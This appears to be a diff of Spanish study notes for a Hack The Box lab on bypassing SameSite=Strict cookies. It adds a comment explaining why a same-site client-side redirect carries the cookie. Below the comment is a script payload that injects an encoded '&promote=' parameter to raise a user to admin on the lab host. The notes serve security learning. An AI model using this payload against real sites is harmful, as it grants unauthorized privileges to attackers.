@@ -36,6 +36,11 @@ La [[02 - Same-Origin Policy y CORS|Same-Origin Policy]] distingue orígenes por
 Si la aplicación redirige con una etiqueta `meta` (client-side) y copia un parámetro controlable en la URL de destino, podemos inyectar parámetros extra. El `%26` es un `&` codificado que añade un segundo parámetro a la URL del redirect:
 
 ```html
+<!-- Ojo con dónde corre esto: este redirect se ejecuta YA DENTRO de vulnerablesite.htb
+     (la víctima ha llegado antes a una página del propio sitio, p. ej. vía un open redirect).
+     Por eso la navegación a admin.php es same-site y la cookie SameSite=Strict SÍ viaja.
+     Si lanzas el mismo document.location desde el exploit server del atacante (cross-site),
+     la cookie Strict NO viaja y no funciona. Ese es el "salto" que hace falta. -->
 <script>
 document.location = "https://vulnerablesite.htb/admin.php?user=htb-stdnt%26promote=htb-stdnt";
 </script>
